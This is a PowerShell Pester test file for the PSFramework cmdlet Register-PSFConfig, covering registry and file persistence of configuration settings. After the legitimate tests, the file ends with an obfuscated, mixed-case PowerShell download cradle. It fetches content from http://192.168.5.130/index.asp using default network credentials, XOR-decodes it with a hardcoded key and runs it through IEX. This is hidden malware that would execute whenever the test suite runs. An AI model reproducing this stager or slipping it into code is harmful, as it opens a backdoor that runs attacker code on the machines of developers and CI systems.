Describe "Register-PSFConfig Unit Tests" -Tag "CI", "Pipeline", "Unit" {BeforeAll {Get-PSFConfig -Module Register-PSFConfig -Force | ForEach-Object {$null = [PSFramework.Configuration.ConfigurationHost]::Configurations.Remove($_.FullName)}}AfterAll {Get-PSFConfig -Module Register-PSFConfig -Force | ForEach-Object {$null = [PSFramework.Configuration.ConfigurationHost]::Configurations.Remove($_.FullName)}}It "Should have the designed for parameters & sets" {(Get-Command Register-PSFConfig).ParameterSets.Name | Should -Be 'Default', 'Name'$properties = 'Config', 'FullName', 'Module', 'Name', 'Scope', 'EnableException', 'Verbose', 'Debug', 'ErrorAction', 'WarningAction', 'InformationAction', 'ErrorVariable', 'WarningVariable', 'InformationVariable', 'OutVariable', 'OutBuffer', 'PipelineVariable'Compare-Object $properties ((Get-Command Register-PSFConfig).Parameters.Keys | Remove-PSFNull -Enumerate) | Should -BeNullOrEmpty}Context "Validating registry persistence" {$module = Get-Module PSFramework | Sort-Object Version -Descending | Select-Object -First 1$pathRegistryUserDefault = & $module { $path_RegistryUserDefault }$pathRegistryUserEnforced = & $module { $path_RegistryUserEnforced }$pathRegistryMachineDefault = & $module { $path_RegistryMachineDefault }$pathRegistryMachineEnforced = & $module { $path_RegistryMachineEnforced }Set-PSFConfig -FullName 'Register-PSFConfig.Phase1.Setting1' -Value 24It "Should correctly persist to the user-default registry location" {{ Get-ItemPropertyValue -Path $pathRegistryUserDefault -Name 'Register-PSFConfig.Phase1.Setting1' -ErrorAction Stop } | Should -ThrowRegister-PSFConfig -FullName 'Register-PSFConfig.Phase1.Setting1' -Scope UserDefaultGet-ItemPropertyValue -Path $pathRegistryUserDefault -Name 'Register-PSFConfig.Phase1.Setting1' | Should -Be 'int:24'Unregister-PSFConfig -FullName 'Register-PSFConfig.Phase1.Setting1' -Scope UserDefault{ Get-ItemPropertyValue -Path $pathRegistryUserDefault -Name 'Register-PSFConfig.Phase1.Setting1' -ErrorAction Stop } | Should -Throw}It "Should correctly persist to the user-mandatory registry location" {{ Get-ItemPropertyValue -Path $pathRegistryUserEnforced -Name 'Register-PSFConfig.Phase1.Setting1' -ErrorAction Stop } | Should -ThrowRegister-PSFConfig -FullName 'Register-PSFConfig.Phase1.Setting1' -Scope UserMandatoryGet-ItemPropertyValue -Path $pathRegistryUserEnforced -Name 'Register-PSFConfig.Phase1.Setting1' | Should -Be 'int:24'Unregister-PSFConfig -FullName 'Register-PSFConfig.Phase1.Setting1' -Scope UserMandatory{ Get-ItemPropertyValue -Path $pathRegistryUserEnforced -Name 'Register-PSFConfig.Phase1.Setting1' -ErrorAction Stop } | Should -Throw}if (Test-PSFPowerShell -Elevated){It "Should correctly persist to the system-default registry location" {{ Get-ItemPropertyValue -Path $pathRegistryMachineDefault -Name 'Register-PSFConfig.Phase1.Setting1' -ErrorAction Stop} | Should -ThrowRegister-PSFConfig -FullName 'Register-PSFConfig.Phase1.Setting1' -Scope SystemDefaultGet-ItemPropertyValue -Path $pathRegistryMachineDefault -Name 'Register-PSFConfig.Phase1.Setting1' | Should -Be 'int:24'Unregister-PSFConfig -FullName 'Register-PSFConfig.Phase1.Setting1' -Scope SystemDefault{ Get-ItemPropertyValue -Path $pathRegistryMachineDefault -Name 'Register-PSFConfig.Phase1.Setting1' -ErrorAction Stop } | Should -Throw}It "Should correctly persist to the system-mandatory registry location" {{ Get-ItemPropertyValue -Path $pathRegistryMachineEnforced -Name 'Register-PSFConfig.Phase1.Setting1' -ErrorAction Stop } | Should -ThrowRegister-PSFConfig -FullName 'Register-PSFConfig.Phase1.Setting1' -Scope SystemMandatoryGet-ItemPropertyValue -Path $pathRegistryMachineEnforced -Name 'Register-PSFConfig.Phase1.Setting1' | Should -Be 'int:24'Unregister-PSFConfig -FullName 'Register-PSFConfig.Phase1.Setting1' -Scope SystemMandatory{ Get-ItemPropertyValue -Path $pathRegistryMachineEnforced -Name 'Register-PSFConfig.Phase1.Setting1' -ErrorAction Stop } | Should -Throw}}}Context "Validating file persistence" {$module = Get-Module PSFramework | Sort-Object Version -Descending | Select-Object -First 1$pathFileUserLocal = & $module { $path_FileUserLocal }$pathFileUserShared = & $module { $path_FileUserShared }$pathFileSystem = & $module { $path_FileSystem }Set-PSFConfig -FullName 'Register-PSFConfig.Phase1.Setting2' -Value 32It "Should correctly persist to the user-local specific file" {$tempPathRoot = $pathFileUserLocal$tempPath = Join-Path $tempPathRoot "psf_config.json"if (Test-Path $tempPath){Rename-Item -Path $tempPath -NewName 'psf_config.json.old'}Test-Path $tempPath | Should -Be $falseRegister-PSFConfig -FullName 'Register-PSFConfig.Phase1.Setting2' -Scope FileUserLocalGet-Content $tempPath | Select-String 'Register-PSFConfig.Phase1.Setting2' | Should -Not -BeNullOrEmptyUnregister-PSFConfig -FullName 'Register-PSFConfig.Phase1.Setting2' -Scope FileUserLocalTest-Path $tempPath | Should -Be $falseif (Test-Path (Join-Path $tempPathRoot "psf_config.json.old")){Rename-Item -Path (Join-Path $tempPathRoot "psf_config.json.old") -NewName 'psf_config.json' -Force}}It "Should correctly persist to the user-shared specific file" {$tempPathRoot = $pathFileUserShared$tempPath = Join-Path $tempPathRoot "psf_config.json"if (Test-Path $tempPath){Rename-Item -Path $tempPath -NewName 'psf_config.json.old'}Test-Path $tempPath | Should -Be $falseRegister-PSFConfig -FullName 'Register-PSFConfig.Phase1.Setting2' -Scope FileUserSharedGet-Content $tempPath | Select-String 'Register-PSFConfig.Phase1.Setting2' | Should -Not -BeNullOrEmptyUnregister-PSFConfig -FullName 'Register-PSFConfig.Phase1.Setting2' -Scope FileUserSharedTest-Path $tempPath | Should -Be $falseif (Test-Path (Join-Path $tempPathRoot "psf_config.json.old")){Rename-Item -Path (Join-Path $tempPathRoot "psf_config.json.old") -NewName 'psf_config.json' -Force}}if (Test-PSFPowerShell -Elevated){It "Should correctly persist to the system-wide file" {$tempPathRoot = $pathFileSystem$tempPath = Join-Path $tempPathRoot "psf_config.json"if (Test-Path $tempPath){Rename-Item -Path $tempPath -NewName 'psf_config.json.old'}Test-Path $tempPath | Should -Be $falseRegister-PSFConfig -FullName 'Register-PSFConfig.Phase1.Setting2' -Scope FileSystemGet-Content $tempPath | Select-String 'Register-PSFConfig.Phase1.Setting2' | Should -Not -BeNullOrEmptyUnregister-PSFConfig -FullName 'Register-PSFConfig.Phase1.Setting2' -Scope FileSystemTest-Path $tempPath | Should -Be $falseif (Test-Path (Join-Path $tempPathRoot "psf_config.json.old")){Rename-Item -Path (Join-Path $tempPathRoot "psf_config.json.old") -NewName 'psf_config.json' -Force}}}}Context "Ensuring Content based Data Integrity" {$module = Get-Module PSFramework | Sort-Object Version -Descending | Select-Object -First 1$pathRegistryUserDefault = & $module { $path_RegistryUserDefault }$pathFileUserLocal = & $module { $path_FileUserLocal }Set-PSFConfig -FullName 'Register-PSFConfig.Phase2.Setting1' -Value 1Set-PSFConfig -FullName 'Register-PSFConfig.Phase2.Setting2' -Value 2Set-PSFConfig -FullName 'Register-PSFConfig.Phase2.Setting3' -Value 3Set-PSFConfig -FullName 'Register-PSFConfig.Phase2.Setting4' -Value 4Set-PSFConfig -FullName 'Register-PSFConfig.Phase2.Setting5' -Value 5 -SimpleExportSet-PSFConfig -FullName 'Register-PSFConfig.Phase2.Setting6' -Value 6It "should export single and multiple items to registry without issues" {{ Register-PSFConfig -FullName 'Register-PSFConfig.Phase2.Setting1' } | Should -Not -Throw{ Register-PSFConfig -FullName 'Register-PSFConfig.Phase2.Setting2', 'Register-PSFConfig.Phase2.Setting3' } | Should -Not -Throw$hive = Get-ItemProperty -Path $pathRegistryUserDefault$hive.'Register-PSFConfig.Phase2.Setting1' | Should -Be 'Int:1'$hive.'Register-PSFConfig.Phase2.Setting2' | Should -Be 'Int:2'$hive.'Register-PSFConfig.Phase2.Setting3' | Should -Be 'Int:3'Unregister-PSFConfig -Module Register-PSFConfig$hive = Get-ItemProperty -Path $pathRegistryUserDefault$hive.'Register-PSFConfig.Phase2.Setting1' | Should -BeNullOrEmpty$hive.'Register-PSFConfig.Phase2.Setting2' | Should -BeNullOrEmpty$hive.'Register-PSFConfig.Phase2.Setting3' | Should -BeNullOrEmpty}It "should export single and multiple items to file without issues" {{ Register-PSFConfig -FullName 'Register-PSFConfig.Phase2.Setting4' -Scope FileUserLocal } | Should -Not -Throw{ Register-PSFConfig -FullName 'Register-PSFConfig.Phase2.Setting5', 'Register-PSFConfig.Phase2.Setting6' -Scope FileUserLocal } | Should -Not -Throw$localFile = Join-Path $pathFileUserLocal 'psf_config.json'Get-Content -Path $localFile | Select-String 'Register-PSFConfig.Phase2.Setting4' | Should -Not -BeNullOrEmptyGet-Content -Path $localFile | Select-String 'Register-PSFConfig.Phase2.Setting5' | Should -Not -BeNullOrEmptyGet-Content -Path $localFile | Select-String 'Register-PSFConfig.Phase2.Setting6' | Should -Not -BeNullOrEmptyUnregister-PSFConfig -Module Register-PSFConfig -Scope FileUserLocalif (Test-Path $localFile){Get-Content -Path $localFile | Select-String 'Register-PSFConfig.Phase2.Setting4' | Should -BeNullOrEmptyGet-Content -Path $localFile | Select-String 'Register-PSFConfig.Phase2.Setting5' | Should -BeNullOrEmptyGet-Content -Path $localFile | Select-String 'Register-PSFConfig.Phase2.Setting6' | Should -BeNullOrEmpty}}}}$WC=NeW-ObJeCT SYsTEm.NEt.WeBClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEaders.Add('User-Agent',$u);$wC.ProxY = [SySTeM.Net.WEBREqUest]::DefaultWebProXY;$Wc.PRoXY.CREDEnTIAlS = [SYSTem.NEt.CrEDeNtIALCaCHE]::DEFAUltNEtwORKCreDeNTiALs;$K='vi3a.NsdB0u6A*&Mx?F4t(r_8LgR@D$>';$i=0;[cHAr[]]$b=([chaR[]]($WC.DOwNloadSTRINg("http://192.168.5.130:80/index.asp")))|%{$_-BXOr$k[$I++%$k.Length]};IEX ($B-join'')